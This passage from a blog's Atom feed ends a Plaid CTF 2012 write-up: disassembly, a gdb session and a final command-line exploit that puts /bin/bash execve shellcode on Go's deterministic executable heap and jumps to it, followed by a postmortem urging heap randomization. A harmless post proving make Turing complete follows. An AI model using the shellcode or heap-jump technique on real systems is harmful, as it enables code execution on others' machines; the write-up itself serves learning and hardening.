&lt;span class="x"&gt; 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062505:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062508:       89 44 24 08             mov    %eax,0x8(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062512:       89 44 24 04             mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062516:       e8 ad 6c 25 00          call   82b91c8 &amp;lt;sprintf@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 806251b:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806251e:       e8 b5 6c 25 00          call   82b91d8 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx&lt;/span&gt;
&lt;span class="x"&gt; 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 8062537:       c3                      ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
&lt;span class="go"&gt;Loading Go Runtime support.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b *0x8062537&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8062537&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xbffff1ac: 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;(gdb) find 0x18600000, 0x18900000, 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;0x1883cd7b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;p&gt;
Success!
&lt;/p&gt;
&lt;h3&gt;Postmortem&lt;/h3&gt;
&lt;p&gt;
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
&lt;/p&gt;

&lt;p&gt;
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
&lt;/p&gt;

&lt;h3&gt;Go Community Response&lt;/h3&gt;

&lt;p&gt;
For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
&lt;/p&gt;

&lt;h3&gt;Other writeups&lt;/h3&gt;

&lt;p&gt;
There are writeups of this problem available by:
&lt;ul&gt;
    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h3&gt;tl;dr&lt;/h3&gt;

&lt;p&gt;
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
&lt;/p&gt;

&lt;p&gt;&lt;span style="display:none;"&gt;Writeup by Alex Reece, see me on &lt;a href="https://plus.google.com/106589059588263736517?rel=author"&gt;Google&lt;/a&gt;+.&lt;/span&gt; &lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry><entry><title>CS Theory with Make</title><link href="http://codearcana.com/posts/2012/03/cs-theory-with-make.html" rel="alternate"></link><updated>2012-03-05T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-03-05:posts/2012/03/cs-theory-with-make.html</id><summary type="html">&lt;p&gt;eventually provide a constructive proof that the make syntax is turing complete via reduction to μ-recursion.&lt;/p&gt;
&lt;p&gt;First, we have to construct numbers. I used the representation of numbers as
unary strings of the character &lt;code&gt;0&lt;/code&gt;: ie, the number 4 is represented by &lt;code&gt;0000&lt;/code&gt;
(zero being the empty string). We can also compute the successor of a number:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# If this is called as a make function, $(1) will be replaced with the first&lt;/span&gt;
&lt;span class="c"&gt;# function argument.&lt;/span&gt;
&lt;span class="nv"&gt;successor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; O&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;info &lt;span class="k"&gt;$(&lt;/span&gt;call successor,O&lt;span class="k"&gt;))&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;OO&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Life is a lot easier if we can compute predecesser. Luckily, this is pretty
easy for us too:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;monus_one&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;patsubst O%,%,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;

&lt;span class="k"&gt;$(&lt;/span&gt;info &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,OO&lt;span class="k"&gt;))&lt;/span&gt;  &lt;span class="c"&gt;# Outputs &amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now lets actually do computation with this. It is hideous, but we can actually
compute fibonacci numbers in make:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;,O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let me try to break this up a bit. I'll add comments but it will no longer be
valid make.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# fib (n):&lt;/span&gt;
&lt;span class="nv"&gt;fib&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;, &lt;span class="c"&gt;# If n &amp;gt; 0:&lt;/span&gt;
          &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;, &lt;span class="c"&gt;# if n - 1 &amp;gt; 0:&lt;/span&gt;
&lt;span class="c"&gt;              # return fib(n-1) + fib(n-2)&lt;/span&gt;
              &lt;span class="k"&gt;$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call fib,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one, &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))))&lt;/span&gt;
          ,O&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="c"&gt;# else: return 1&lt;/span&gt;
      ,O&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c"&gt;# else: return 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is pretty fun and all, but we haven't actually done anything that we
couldn't do with a primitive recursive function. We can easily show that make
is more powerful than primitive recusion by encoding the &lt;a href="https://en.wikipedia.org/wiki/Ackermann_function"&gt;Ackerman
function&lt;/a&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;ack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="se"&gt;\&lt;/span&gt;
  ack,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call ack,&lt;span class="k"&gt;$(&lt;/span&gt;call monus_one,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;,O&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, so how far can we take this? As it turns out, there is a class of
functions that are computable only by a turing complete language:
&lt;a href="https://en.wikipedia.org/wiki/%CE%9C-recursive_function"&gt;µ-recursive 
functions&lt;/a&gt;. They are
the primitive recursive functions with the addition of the minimization (µ)
operator: µ of f(x) is the minimum x such that f(x)=0. As it turns out, we can
encode this operator in make:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="c"&gt;# muh f x returns the first number greater than or equal to x such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;muh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;))&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,O&lt;span class="k"&gt;$(&lt;/span&gt;2&lt;span class="k"&gt;)))&lt;/span&gt;

&lt;span class="c"&gt;# mu f x returns the first number greater than or equal to 0 such&lt;/span&gt;
&lt;span class="c"&gt;# that f(x) is true.&lt;/span&gt;
&lt;span class="nv"&gt;mu&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call muh,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Wow! There we have it, make is turing complete. As a final piece of fun, here
is the inverse ackerman function:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(if&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,,O&lt;span class="k"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# lesseq_template n creates a function lesseq_y that returns y &amp;lt; x&lt;/span&gt;
&lt;span class="cp"&gt;define lesseq_template&lt;/span&gt;
  lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;findstring &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# geack_template y creates a function geack_y that returns ack(x) &amp;gt; y&lt;/span&gt;
&lt;span class="cp"&gt;define geack_template&lt;/span&gt;
  geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call lesseq_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call not,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call lesseq_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;call ack,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;1&lt;span class="o"&gt;))))&lt;/span&gt;
&lt;span class="cp"&gt;endef&lt;/span&gt;

&lt;span class="c"&gt;# invack n: Find the first value x such that ack(x) &amp;gt; n.&lt;/span&gt;
&lt;span class="nv"&gt;invack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;call geack_template,&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;)))$(&lt;/span&gt;call mu,geack_&lt;span class="k"&gt;$(&lt;/span&gt;1&lt;span class="k"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</summary><category term="make"></category><category term="theory"></category></entry></feed>